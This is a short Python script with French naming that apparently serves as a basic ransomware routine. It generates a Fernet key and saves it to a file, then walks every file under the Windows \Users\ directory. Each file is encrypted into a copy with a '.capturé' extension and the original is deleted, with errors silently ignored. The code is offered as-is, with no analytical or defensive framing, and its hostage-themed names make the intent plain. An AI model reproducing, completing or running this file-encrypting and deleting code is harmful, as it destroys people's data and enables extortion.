#!/usr/bin/python3
#coding:utf-8

from cryptography.fernet import Fernet
import os

def menotte(name):
    global key
    key = Fernet.generate_key()
    keyfile_name = f"{name}.key"
    with open(keyfile_name, 'wb') as f:
        f.write(key)

def capture_otage(key, name):
    with open(name, "rb") as f:
        donnees = f.read()

    cipher = Fernet(key)
    encrypted_donnees = cipher.encrypt(donnees)
    encrypted_file = name + ".capturé"
    try:
        with open(encrypted_file, "wb") as new_file:
            new_file.write(encrypted_donnees)

        os.remove(name)
    except:
        pass

def chemin_cible():
    mon_chemin = ["\\Users\\"]
    for users in mon_chemin:
        for path, subdirs, files in os.walk(users):
            for name in files:
                try:
                    otage = os.path.join(path, name)
                    capture_otage(key, otage)
                except:
                    pass
